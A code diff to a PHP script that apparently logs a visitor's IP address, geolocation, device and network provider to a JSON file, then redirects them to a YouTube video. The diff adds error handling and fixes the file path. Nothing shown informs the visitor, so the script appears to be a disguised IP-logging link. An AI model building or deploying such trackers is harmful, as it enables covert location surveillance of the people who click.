@@ -58,16 +58,21 @@ function getInfo()
         $ip = "91.106.45.252";
     };
 
+    try {
 
-    $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=tryout"), true);
-
-    $provider = $details['connection']['organization'];
-
-    if ($latitude == "error") {
-        $latitude = $details['location']['latitude'];
-        $longtitude = $details['location']['longitude'];
+        $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=tryout"), true);
+        $provider = $details['connection']['organization'];
+        if ($latitude == "error") {
+            $latitude = $details['location']['latitude'];
+            $longtitude = $details['location']['longitude'];
+            $method = 'ipaddress';
+        }
+    } catch (Exception $e) {
+        $provider = $e;
         $method = 'ipaddress';
     }
+
+
 
     $newarray = [
         'date' => $date, 'ip' => $ip, 'device' => $device,
@@ -86,7 +91,8 @@ function createUser($id)
     $users[] = $newData;
     $users = json_encode($users);
 
-    file_put_contents('us\users.json', $users);
+    file_put_contents('users.json', $users);
+    sleep(1);
     $link = "Location: https://www.youtube.com/watch?v=${id}";
     header($link, true, 301);
 }
